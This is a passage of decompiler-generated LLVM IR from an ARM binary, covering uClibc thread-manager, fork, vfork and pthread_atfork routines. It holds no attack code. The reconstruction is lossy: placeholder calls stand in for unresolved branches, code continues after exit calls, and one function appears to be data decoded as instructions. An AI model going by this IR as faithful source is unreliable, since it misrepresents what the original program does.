  store i32 %v1_1ce24, i32* @r0, align 4
  %v1_1ce28 = mul nuw nsw i32 %v1_1ce24, 16777216
  %v3_1ce2c = add nuw i32 %v1_1ce28, 16777216
  %v3_1ce30 = sdiv i32 %v3_1ce2c, 33554432
  store i32 %v3_1ce30, i32* %r3.global-to-local, align 4
  %v3_1ce2c.off = add nuw i32 %v1_1ce28, 50331647
  %tmp = icmp ult i32 %v3_1ce2c.off, 67108863
  store i1 %tmp, i1* %cpsr_z.global-to-local, align 1
  %tmp25 = icmp slt i32 %v3_1ce2c, 33554432
  br i1 %tmp25, label %dec_label_pc_1ce4c.backedge, label %dec_label_pc_1ce3c

dec_label_pc_1ce3c:                               ; preds = %dec_label_pc_1ce20
  %v2_1ce40 = call i32 @pthread_kill_all_threads(i32 %v1_1ce24, i32 1)
  %v1_1ce48 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1ce4c.backedge

dec_label_pc_1ce4c.backedge:                      ; preds = %dec_label_pc_1ce3c, %dec_label_pc_1ce20
  store i32 -2147483647, i32* %r2.global-to-local, align 4
  %v3_1ce58 = call i32 @waitpid(i32 -1, i32 %v2_1cd3c, i32 -2147483647)
  %v2_1ce5c = icmp eq i32 %v3_1ce58, 0
  store i1 %v2_1ce5c, i1* %cpsr_z.global-to-local, align 1
  %v5_1ce60 = icmp sgt i32 %v3_1ce58, 0
  br i1 %v5_1ce60, label %dec_label_pc_1cd54, label %dec_label_pc_1ce64

dec_label_pc_1ce64:                               ; preds = %dec_label_pc_1ce4c.backedge, %entry
  %v3_1ce58.lcssa = phi i32 [ %v3_1ce581, %entry ], [ %v3_1ce58, %dec_label_pc_1ce4c.backedge ]
  store i32 %v6_1cd1c, i32* @r5, align 4
  store i32 %v12_1cd1c, i32* @r7, align 4
  ret i32 %v3_1ce58.lcssa

; uselistorder directives
  uselistorder i32 %v3_1ce58, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1ce24, { 1, 2, 0 }
  uselistorder i32 %v0_1cd74, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1cdc8, { 1, 0 }
  uselistorder i32 %v2_1cd6c, { 1, 0, 2 }
  uselistorder i32 %v3_1ce581, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1cd3c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 3, 4, 5, 1, 6, 7, 8, 9, 2, 0 }
  uselistorder i32 -2147483647, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1ce20, { 1, 0 }
  uselistorder label %dec_label_pc_1ce00, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1cdd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cd54, { 1, 0 }
}

define i32 @function_1ce74(i64* %arg1) local_unnamed_addr {
dec_label_pc_1ce74:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1ce74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ce74, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ce74
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ce74, %bb
  %v10_1ce80 = phi i32 [ %tmp, %dec_label_pc_1ce74 ], [ 0, %bb ]
  ret i32 %v10_1ce80

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @sb, align 4
  %v4_1ce90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120) to i32*), align 4
  store i32 %v4_1ce90, i32* %r2.global-to-local, align 4
  %v2_1cea0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_1cea0, i32* @r4, align 4
  %v1_1cea8 = add i32 %v4_1ce90, 80
  %v1_1ceac = add i32 %v4_1ce90, 72
  store i32 %v1_1ceac, i32* @lr, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_1ceb4 = add i32 %v4_1ce90, 76
  %v3_1ceb4 = inttoptr i32 %v2_1ceb4 to i32*
  store i32 %v1_1cea8, i32* %v3_1ceb4, align 4
  %v0_1cebc = load i32, i32* @lr, align 4
  %v1_1cebc = load i32, i32* %r2.global-to-local, align 4
  %v2_1cebc = add i32 %v1_1cebc, 68
  %v3_1cebc = inttoptr i32 %v2_1cebc to i32*
  store i32 %v0_1cebc, i32* %v3_1cebc, align 4
  store i32 %v2_1cea0, i32* @r0, align 4
  %v0_1cec8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1cec8, i32* %stack_var_-16, align 4
  %v1_1cecc = call i32 @__GI_sigdelset(i32 %v2_1cea0)
  store i32 %v2_1cea0, i32* @r0, align 4
  %v1_1ced8 = call i32 @__GI_sigdelset(i32 %v2_1cea0)
  %v0_1cee0 = load i32, i32* @sb, align 4
  %v2_1cee0 = add i32 %v0_1cee0, 276
  %v3_1cee0 = inttoptr i32 %v2_1cee0 to i32*
  %v4_1cee0 = load i32, i32* %v3_1cee0, align 4
  %v1_1cee4 = inttoptr i32 %v4_1cee0 to i32*
  %v2_1cee4 = load i32, i32* %v1_1cee4, align 4
  %v2_1cee8 = icmp eq i32 %v2_1cee4, 0
  br i1 %v2_1cee8, label %dec_label_pc_1cf08, label %dec_label_pc_1cef0

dec_label_pc_1cef0:                               ; preds = %entry
  %v2_1cef4 = add i32 %v0_1cee0, 72
  %v3_1cef4 = inttoptr i32 %v2_1cef4 to i32*
  %v4_1cef4 = load i32, i32* %v3_1cef4, align 4
  %v1_1cef8 = inttoptr i32 %v4_1cef4 to i32*
  %v2_1cef8 = load i32, i32* %v1_1cef8, align 4
  %tmp40 = icmp slt i32 %v2_1cef8, 1
  br i1 %tmp40, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1cef0
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1cef0, %bb
  store i32 118536, i32* @lr, align 4
  %v5_1cf04 = icmp sgt i32 %v2_1cef8, 0
  call void @__pseudo_cond_branch(i1 %v5_1cf04, i32 ptrtoint (i32* @global_var_28814.1222 to i32))
  br label %dec_label_pc_1cf08

dec_label_pc_1cf08:                               ; preds = %entry, %bb41
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1cf14 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1cea0, i32 0)
  %v0_1cf1c = load i32, i32* @sb, align 4
  %v2_1cf1c = add i32 %v0_1cf1c, 260
  %v3_1cf1c = inttoptr i32 %v2_1cf1c to i32*
  %v4_1cf1c = load i32, i32* %v3_1cf1c, align 4
  %v1_1cf20 = inttoptr i32 %v4_1cf1c to i32*
  %v2_1cf20 = load i32, i32* %v1_1cf20, align 4
  %v1_1cf24 = add i32 %v2_1cf20, 24
  %v2_1cf24 = inttoptr i32 %v1_1cf24 to i32*
  %v3_1cf24 = load i32, i32* %v2_1cf24, align 4
  %v1_1cf28 = call i32 @__pthread_manager_adjust_prio(i32 %v3_1cf24)
  %v2_1cf2c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1cf2c, i32* @r4, align 4
  br label %dec_label_pc_1cf30

dec_label_pc_1cf30:                               ; preds = %dec_label_pc_1cf48, %dec_label_pc_1cf08
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_1cf3c = call i32 @read(i32 %arg1, i32 %v2_1cf2c, i32 28)
  %v3_1cf40 = icmp eq i32 %v3_1cf3c, -1
  br i1 %v3_1cf40, label %dec_label_pc_1cf48, label %dec_label_pc_1cf58

dec_label_pc_1cf48:                               ; preds = %dec_label_pc_1cf30
  %v0_1cf48 = call i32 @__errno_location()
  %v1_1cf4c = inttoptr i32 %v0_1cf48 to i32*
  %v2_1cf4c = load i32, i32* %v1_1cf4c, align 4
  %v7_1cf50 = icmp eq i32 %v2_1cf4c, 4
  br i1 %v7_1cf50, label %dec_label_pc_1cf30, label %dec_label_pc_1cf58

dec_label_pc_1cf58:                               ; preds = %dec_label_pc_1cf30, %dec_label_pc_1cf48
  store i32 %arg1, i32* %stack_var_-8, align 4
  store i32 72, i32* %ip.global-to-local, align 4
  store i32 260, i32* %r2.global-to-local, align 4
  %v2_1cfb0 = ptrtoint i32* %stack_var_-8 to i32
  %tmp = urem i16 %tmp23, 2
  %v2_1cffc = icmp eq i16 %tmp, 0
  %tmp44 = icmp ult i32 %tmp22, 6
  %v7_1d01c = mul i32 %tmp22, 4
  %v8_1d01c = add i32 %v7_1d01c, ptrtoint (i32* @global_var_1d024.1229 to i32)
  br label %dec_label_pc_1cfa8

dec_label_pc_1cfa8:                               ; preds = %bb43, %dec_label_pc_1d004, %.thread, %dec_label_pc_1cfc8, %dec_label_pc_1cff8, %dec_label_pc_1d604, %dec_label_pc_1cf58
  store i32 2000, i32* %r2.global-to-local, align 4
  %v3_1cfb4 = call i32 @__GI_poll(i32 %v2_1cfb0, i32 1, i32 2000)
  store i32 %v3_1cfb4, i32* @r0, align 4
  store i32 %v3_1cfb4, i32* @r4, align 4
  %v0_1cfbc = call i32 @getppid()
  %v7_1cfc0 = icmp eq i32 %v0_1cfbc, 1
  br i1 %v7_1cfc0, label %dec_label_pc_1cfc8, label %dec_label_pc_1cfd8

dec_label_pc_1cfc8:                               ; preds = %dec_label_pc_1cfa8
  store i32 9, i32* @r0, align 4
  %v2_1cfd0 = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  %v1_1d5d8 = call i32 @__GI__exit(i32 0)
  %v1_1d5e4 = load i32, i32* @sb, align 4
  %v3_1d5e4 = add i32 %v1_1d5e4, 38352
  %v4_1d5e4 = inttoptr i32 %v3_1d5e4 to i32*
  store i32 1, i32* %v4_1d5e4, align 4
  %v0_1d5e8 = call i32 @pthread_reap_children()
  store i32 260, i32* %r2.global-to-local, align 4
  %v0_1d5f0 = load i32, i32* @sb, align 4
  %v2_1d5f0 = add i32 %v0_1d5f0, 260
  %v3_1d5f0 = inttoptr i32 %v2_1d5f0 to i32*
  %v4_1d5f0 = load i32, i32* %v3_1d5f0, align 4
  %v1_1d5f4 = inttoptr i32 %v4_1d5f0 to i32*
  %v2_1d5f4 = load i32, i32* %v1_1d5f4, align 4
  %v1_1d5f8 = inttoptr i32 %v2_1d5f4 to i32*
  %v2_1d5f8 = load i32, i32* %v1_1d5f8, align 4
  store i32 %v2_1d5f8, i32* @r0, align 4
  %v9_1d5fc = icmp eq i32 %v2_1d5f8, %v2_1d5f4
  br i1 %v9_1d5fc, label %dec_label_pc_1d604, label %dec_label_pc_1cfa8

dec_label_pc_1cfd8:                               ; preds = %dec_label_pc_1cfa8
  store i32 38348, i32* %ip.global-to-local, align 4
  %v0_1cfdc = load i32, i32* @sb, align 4
  %v2_1cfdc = add i32 %v0_1cfdc, 38348
  %v3_1cfdc = inttoptr i32 %v2_1cfdc to i32*
  %v4_1cfdc = load i32, i32* %v3_1cfdc, align 4
  %v2_1cfe0 = icmp eq i32 %v4_1cfdc, 0
  br i1 %v2_1cfe0, label %.thread, label %bb42

bb42:                                             ; preds = %dec_label_pc_1cfd8
  store i32 0, i32* %v3_1cfdc, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1cfd8, %bb42
  store i32 118768, i32* @lr, align 4
  %v1_1cfec = xor i1 %v2_1cfe0, true
  call void @__pseudo_cond_branch(i1 %v1_1cfec, i32 ptrtoint (i32* @global_var_1cd1c.1228 to i32))
  %v0_1cff0 = load i32, i32* @r4, align 4
  %v7_1cff0 = icmp eq i32 %v0_1cff0, 1
  br i1 %v7_1cff0, label %dec_label_pc_1cff8, label %dec_label_pc_1cfa8

dec_label_pc_1cff8:                               ; preds = %.thread
  br i1 %v2_1cffc, label %dec_label_pc_1cfa8, label %dec_label_pc_1d004

dec_label_pc_1d004:                               ; preds = %dec_label_pc_1cff8
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_1d010 = call i32 @read(i32 %arg1, i32 %v2_1cf2c, i32 28)
  br i1 %tmp44, label %bb43, label %dec_label_pc_1cfa8

bb43:                                             ; preds = %dec_label_pc_1d004
  call void @__pseudo_branch(i32 %v8_1d01c)
  br label %dec_label_pc_1cfa8

dec_label_pc_1d604:                               ; preds = %dec_label_pc_1cfc8
  %v1_1d604 = call i32 @restart(i32 %v2_1d5f4)
  br label %dec_label_pc_1cfa8

; uselistorder directives
  uselistorder i32 %v2_1cea0, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v4_1ce90, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %tmp22, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 38352, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @read, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1cfa8, { 5, 0, 1, 4, 2, 3, 6 }
  uselistorder label %dec_label_pc_1cf58, { 1, 0 }
  uselistorder label %dec_label_pc_1cf08, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_1d65c(i64* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1d65c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i64* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1d65c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1d65c, label %bb, label %.thread15

bb:                                               ; preds = %dec_label_pc_1d65c
  %v2_1d65c = load i32, i32* @r8, align 4
  %v4_1d65c = lshr i32 %v2_1d65c, %tmp
  %v5_1d65c = sub i32 32, %tmp
  %v6_1d65c = shl i32 %v2_1d65c, %v5_1d65c
  %v7_1d65c = or i32 %v6_1d65c, %v4_1d65c
  %v9_1d65c = and i32 %v7_1d65c, %tmp
  %v4_1d660 = inttoptr i32 %v9_1d65c to i32*
  store i32 %v9_1d65c, i32* %v4_1d660, align 4
  %v5_1d660 = load i32, i32* @ip, align 4
  %v9_1d688 = sub i32 0, %v5_1d660
  store i32 %v9_1d688, i32* %r0.global-to-local, align 4
  %v4_1d68c = inttoptr i32 %v9_1d688 to i32*
  store i32 %v9_1d688, i32* %v4_1d68c, align 4
  %v5_1d68c = load i32, i32* %r0.global-to-local, align 4
  %v6_1d68c = add i32 %v5_1d68c, -120468
  %v5_1d690 = sub i32 120500, %v5_1d68c
  %v6_1d690 = shl i32 %v6_1d68c, %v5_1d690
  %v9_1d690 = and i32 %v6_1d690, %v6_1d68c
  %v3_1d694 = load i32, i32* %r1.global-to-local, align 4
  %v8_1d694 = lshr i32 %arg3, %v3_1d694
  %v9_1d694 = and i32 %v9_1d690, %v8_1d694
  %v4_1d698 = load i32, i32* @r4, align 4
  %v9_1d698 = sub i32 %v9_1d694, %v4_1d698
  %v4_1d69c = mul i32 %v9_1d698, 2
  %v5_1d69c = and i32 %v4_1d69c, %v9_1d698
  %v2_1d6a0 = load i32, i32* @r8, align 4
  %v5_1d6a0 = udiv i32 %v2_1d6a0, 2
  %v6_1d6a0 = and i32 %v5_1d69c, %v5_1d6a0
  %v2_1d6a4 = load i32, i32* @ip, align 4
  %v5_1d6a4 = udiv i32 %v2_1d6a4, 2
  %v6_1d6a4 = and i32 %v6_1d6a0, %v5_1d6a4
  %v8_1d6ac = shl i32 %v4_1d698, %v6_1d6a4
  %v9_1d6ac = and i32 %v8_1d6ac, %v6_1d6a4
  store i32 %v9_1d6ac, i32* %r0.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %dec_label_pc_1d65c, %bb
  %v10_1d6ac = phi i32 [ %tmp, %dec_label_pc_1d65c ], [ %v9_1d6ac, %bb ]
  ret i32 %v10_1d6ac

; uselistorder directives
  uselistorder i32 %v9_1d698, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread15, { 1, 0 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  %v4_1d6bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120) to i32*), align 4
  store i32 %v4_1d6bc, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v1_1d6c8 = add i32 %v4_1d6bc, 28
  %v2_1d6c8 = inttoptr i32 %v1_1d6c8 to i32*
  %v3_1d6c8 = load i32, i32* %v2_1d6c8, align 4
  store i32 %v3_1d6c8, i32* @r0, align 4
  %v0_1d6cc = call i32 @__pthread_lock()
  %v0_1d6d0 = load i32, i32* @r4, align 4
  %v1_1d6d0 = add i32 %v0_1d6d0, 28
  %v2_1d6d0 = inttoptr i32 %v1_1d6d0 to i32*
  %v3_1d6d0 = load i32, i32* %v2_1d6d0, align 4
  %v1_1d6d4 = call i32 @__pthread_unlock(i32 %v3_1d6d0)
  %v0_1d6d8 = load i32, i32* @r5, align 4
  %v1_1d6dc = call i32 @__pthread_manager(i32 %v0_1d6d8)
  %v0_1d6e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1d6e0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_1d6e0 = load i32, i32* @r2, align 4
  %v2_1d6e0 = inttoptr i32 %v1_1d6e0 to i64*
  %v3_1d6e0 = load i64, i64* %v2_1d6e0, align 4
  %v5_1d6e0 = trunc i64 %v3_1d6e0 to i32
  %v4_1d6e4 = lshr i32 %v5_1d6e0, %v1_1d6dc
  %v5_1d6e4 = sub i32 32, %v1_1d6dc
  %v6_1d6e4 = shl i32 %v5_1d6e0, %v5_1d6e4
  %v7_1d6e4 = or i32 %v6_1d6e4, %v4_1d6e4
  %v9_1d6e4 = and i32 %v7_1d6e4, %v1_1d6dc
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v10_1d6e4 = phi i32 [ %v1_1d6dc, %entry ], [ %v9_1d6e4, %bb ]
  ret i32 %v10_1d6e4

; uselistorder directives
  uselistorder i32 %v5_1d6e0, { 1, 0 }
  uselistorder i32 %v1_1d6dc, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1d6e8 = icmp eq i32 %arg1, 0
  %v0_1d6ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1d6e8, i32 %v0_1d6ec)
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1d71c = load i32, i32* @r4, align 4
  store i32 %v3_1d71c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1d7382 = icmp eq i32* %arg1, null
  br i1 %v2_1d7382, label %dec_label_pc_1d740, label %dec_label_pc_1d728

dec_label_pc_1d728:                               ; preds = %entry, %dec_label_pc_1d728
  %v0_1d728 = phi i32 [ %v3_1d734, %dec_label_pc_1d728 ], [ %tmp, %entry ]
  %v1_1d728 = inttoptr i32 %v0_1d728 to i32*
  %v2_1d728 = load i32, i32* %v1_1d728, align 4
  store i32 %v2_1d728, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_1d728)
  %v0_1d734 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d734 = add i32 %v0_1d734, 4
  %v2_1d734 = inttoptr i32 %v1_1d734 to i32*
  %v3_1d734 = load i32, i32* %v2_1d734, align 4
  store i32 %v3_1d734, i32* %r4.global-to-local, align 4
  %v2_1d738 = icmp eq i32 %v3_1d734, 0
  br i1 %v2_1d738, label %dec_label_pc_1d738.dec_label_pc_1d740_crit_edge, label %dec_label_pc_1d728

dec_label_pc_1d738.dec_label_pc_1d740_crit_edge:  ; preds = %dec_label_pc_1d728
  %v2_1d740.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1d740

dec_label_pc_1d740:                               ; preds = %dec_label_pc_1d738.dec_label_pc_1d740_crit_edge, %entry
  %v2_1d740 = phi i32 [ %v2_1d740.pre, %dec_label_pc_1d738.dec_label_pc_1d740_crit_edge ], [ %v3_1d71c, %entry ]
  store i32 %v2_1d740, i32* @r4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1d734, { 2, 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d728, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1d748 = load i32, i32* @r4, align 4
  %v6_1d748 = load i32, i32* @r5, align 4
  %v9_1d748 = load i32, i32* @r6, align 4
  %v12_1d748 = load i32, i32* @r7, align 4
  %v15_1d748 = load i32, i32* @r8, align 4
  %v24_1d748 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38360), i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896), i32* @r4, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  %v0_1d778 = load i32, i32* @r5, align 4
  %v2_1d778 = add i32 %v0_1d778, 38384
  %v3_1d778 = inttoptr i32 %v2_1d778 to i32*
  %v4_1d778 = load i32, i32* %v3_1d778, align 4
  %v1_1d78c = inttoptr i32 %v4_1d778 to i32*
  %v2_1d78c = call i32 @pthread_call_handlers(i32* %v1_1d78c)
  %v1_1d790 = call i32 @__pthread_once_fork_prepare(i32 %v2_1d78c)
  %v0_1d798 = load i32, i32* @r5, align 4
  %v2_1d798 = add i32 %v0_1d798, 156
  %v3_1d798 = inttoptr i32 %v2_1d798 to i32*
  %v4_1d798 = load i32, i32* %v3_1d798, align 4
  store i32 %v4_1d798, i32* @r7, align 4
  store i32 %v4_1d798, i32* @r0, align 4
  store i32 120744, i32* @lr, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  %v0_1d7a8 = call i32 @__libc_fork()
  store i32 %v0_1d7a8, i32* %sl.global-to-local, align 4
  %v2_1d7ac = icmp eq i32 %v0_1d7a8, 0
  br i1 %v2_1d7ac, label %dec_label_pc_1d7b4, label %dec_label_pc_1d884

dec_label_pc_1d7b4:                               ; preds = %entry
  %v0_1d7b8 = load i32, i32* @r5, align 4
  %v2_1d7b8 = add i32 %v0_1d7b8, -143904
  store i32 %v2_1d7b8, i32* @r6, align 4
  %v9_1d7b8 = icmp eq i32 %v2_1d7b8, 0
  br i1 %v9_1d7b8, label %dec_label_pc_1d870, label %dec_label_pc_1d7c0

dec_label_pc_1d7c0:                               ; preds = %dec_label_pc_1d7b4
  %v2_1d7c0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1d7cc = add i32 %v0_1d7b8, 152
  %v3_1d7cc = inttoptr i32 %v2_1d7cc to i32*
  %v4_1d7cc = load i32, i32* %v3_1d7cc, align 4
  call void @__pseudo_branch(i32 %v4_1d7cc)
  %v0_1d7e4 = load i32, i32* @r5, align 4
  %v2_1d7e4 = add i32 %v0_1d7e4, 56
  %v3_1d7e4 = inttoptr i32 %v2_1d7e4 to i32*
  %v4_1d7e4 = load i32, i32* %v3_1d7e4, align 4
  call void @__pseudo_branch(i32 %v4_1d7e4)
  call void @__pseudo_branch(i32 %v2_1d7b8)
  %v0_1d808 = load i32, i32* @r5, align 4
  %v2_1d808 = add i32 %v0_1d808, 16
  %v3_1d808 = inttoptr i32 %v2_1d808 to i32*
  %v4_1d808 = load i32, i32* %v3_1d808, align 4
  call void @__pseudo_branch(i32 %v4_1d808)
  store i32 %v2_1d7c0, i32* @r4, align 4
  %v0_1d828 = load i32, i32* @r5, align 4
  %v2_1d828 = add i32 %v0_1d828, 152
  %v3_1d828 = inttoptr i32 %v2_1d828 to i32*
  %v4_1d828 = load i32, i32* %v3_1d828, align 4
  call void @__pseudo_branch(i32 %v4_1d828)
  %v0_1d840 = load i32, i32* @r5, align 4
  %v2_1d840 = add i32 %v0_1d840, 56
  %v3_1d840 = inttoptr i32 %v2_1d840 to i32*
  %v4_1d840 = load i32, i32* %v3_1d840, align 4
  call void @__pseudo_branch(i32 %v4_1d840)
  call void @__pseudo_branch(i32 %v2_1d7b8)
  %v0_1d864 = load i32, i32* @r5, align 4
  %v2_1d864 = add i32 %v0_1d864, 16
  %v3_1d864 = inttoptr i32 %v2_1d864 to i32*
  %v4_1d864 = load i32, i32* %v3_1d864, align 4
  store i32 %v4_1d864, i32* @ip, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1d870.1257 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1d864)
  br label %dec_label_pc_1d870

dec_label_pc_1d870:                               ; preds = %dec_label_pc_1d7b4, %dec_label_pc_1d7c0
  %v0_1d870 = call i32 @__pthread_reset_main_thread()
  %v1_1d874 = call i32 @__fresetlockfiles(i32 %v0_1d870)
  %v1_1d878 = call i32 @__pthread_once_fork_child(i32 %v1_1d874)
  br label %dec_label_pc_1d8ac

dec_label_pc_1d884:                               ; preds = %entry
  %v0_1d88c = load i32, i32* @r5, align 4
  %v2_1d88c = add i32 %v0_1d88c, 96
  %v3_1d88c = inttoptr i32 %v2_1d88c to i32*
  %v4_1d88c = load i32, i32* %v3_1d88c, align 4
  store i32 %v4_1d88c, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v4_1d88c)
  call void @__pseudo_branch(i32 %v4_1d88c)
  %v0_1d8a4 = call i32 @__pthread_once_fork_parent()
  br label %dec_label_pc_1d8ac

dec_label_pc_1d8ac:                               ; preds = %dec_label_pc_1d870, %dec_label_pc_1d884
  %storemerge.in = phi i32* [ @r6, %dec_label_pc_1d884 ], [ @sb, %dec_label_pc_1d870 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_1d8ac = inttoptr i32 %storemerge to i32*
  %v2_1d8ac = call i32 @pthread_call_handlers(i32* %v1_1d8ac)
  %v0_1d8b0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_1d748, i32* @r4, align 4
  store i32 %v6_1d748, i32* @r5, align 4
  store i32 %v9_1d748, i32* @r6, align 4
  store i32 %v12_1d748, i32* @r7, align 4
  store i32 %v15_1d748, i32* @r8, align 4
  store i32 %v24_1d748, i32* @lr, align 4
  ret i32 %v0_1d8b0

; uselistorder directives
  uselistorder label %dec_label_pc_1d8ac, { 1, 0 }
  uselistorder label %dec_label_pc_1d870, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_1d8f0 = call i32 @fork()
  ret i32 %v0_1d8f0

; uselistorder directives
  uselistorder i32 ()* @fork, { 10, 8, 7, 6, 9, 5, 4, 2, 3, 1, 0 }
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sl, align 4
  %v1_1d90c = call i32 @malloc(i32 24)
  store i32 %v1_1d90c, i32* %r6.global-to-local, align 4
  %v2_1d914 = icmp eq i32 %v1_1d90c, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_1d914, label %dec_label_pc_1d9a0, label %dec_label_pc_1d924

dec_label_pc_1d924:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1d940.1264 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  %v0_1d944 = load i32, i32* @r7, align 4
  %v0_1d948 = load i32, i32* %r5.global-to-local, align 4
  %v2_1d948 = add i32 %v0_1d948, 38384
  %v0_1d94c = load i32, i32* %r6.global-to-local, align 4
  %v4_1d954 = inttoptr i32 %v0_1d944 to i32*
  %v5_1d954 = call i32 @pthread_insert_list(i32 %v2_1d948, i32* %v4_1d954, i32 %v0_1d94c, i32 0)
  %v0_1d95c = load i32, i32* @r8, align 4
  %v2_1d960 = add i32 %v0_1d948, 38392
  %v1_1d964 = add i32 %v0_1d94c, 8
  %v4_1d96c = inttoptr i32 %v0_1d95c to i32*
  %v5_1d96c = call i32 @pthread_insert_list(i32 %v2_1d960, i32* %v4_1d96c, i32 %v1_1d964, i32 1)
  %v0_1d974 = load i32, i32* @sl, align 4
  %v0_1d978 = load i32, i32* %r6.global-to-local, align 4
  %v1_1d978 = add i32 %v0_1d978, 16
  %v0_1d97c = load i32, i32* %r5.global-to-local, align 4
  %v2_1d97c = add i32 %v0_1d97c, 38388
  %v4_1d984 = inttoptr i32 %v0_1d974 to i32*
  %v5_1d984 = call i32 @pthread_insert_list(i32 %v2_1d97c, i32* %v4_1d984, i32 %v1_1d978, i32 1)
  %v2_1d990 = add i32 %v0_1d97c, 96
